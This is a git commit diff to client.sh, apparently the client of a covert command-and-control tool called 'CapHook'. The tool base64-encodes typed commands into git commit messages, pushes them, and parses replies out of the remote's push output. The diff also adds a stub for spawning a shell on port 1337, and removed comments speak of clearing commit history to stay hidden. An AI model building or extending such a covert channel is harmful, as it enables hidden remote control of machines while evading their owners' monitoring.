dbc188ef36de523c20e377c732e57c9e3ac05f4c
Emmanuel <aadewale123@gmail.com>
2019-10-20 16:53:19 -0400

    more updates

--- client.sh
+++ client.sh
@@ -1,22 +1,32 @@
 #!/bin/bash
 
+execute () {
+	encode=$(echo $1 | base64)
+	echo ${encode}
+    	touch $(cat /dev/urandom | env LC_CTYPE=C tr -dc 'a-zA-Z0-9' | fold -w ${1:-32} | head -n 1)
+	git add . > /dev/null
+    	git commit -m ${encode} > /dev/null
+    	#This is the best I could come up with
+    	# I think I figured it out
+    	git push &> /tmp/git
+    	grep "remote: " /tmp/git | awk '{$1="";print}'
+}
+
 while true; do
     echo "CapHook> "
     read command
-    if[$command == "clear"]
+    if [ $command = "clear" ]
+    then
     	clear
-	echo "CapHook> "
-    encode=$(echo ${command} | base64)
-    echo ${encode}
-    touch $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w ${1:-32} | head -n 1)
-    git add -A > /dev/null
-    git commit -m ${encode} > /dev/null
-    #This is the best I could come up with
-    # I think I figured it out
-    git push &> /tmp/git
-    grep "remote: " /tmp/git | awk '{print $2}'
-#    git push 2>&1 | tee /tmp/git
- #   cat /tmp/git | grep "remote: " | awk '{print $2}'
-	#We could clear our commit history to be hidden
-	#have a flag like -f to go hidden mode which is above
+    elif [ $command = "shell" ]
+	then
+	    # gather ip
+	    echo "spawing a shell on port 1337"
+	    # write a fucntion 
+    elif [ $command = "exit" ]
+	then
+	   exit
+    else
+	execute $command
+     fi
 done
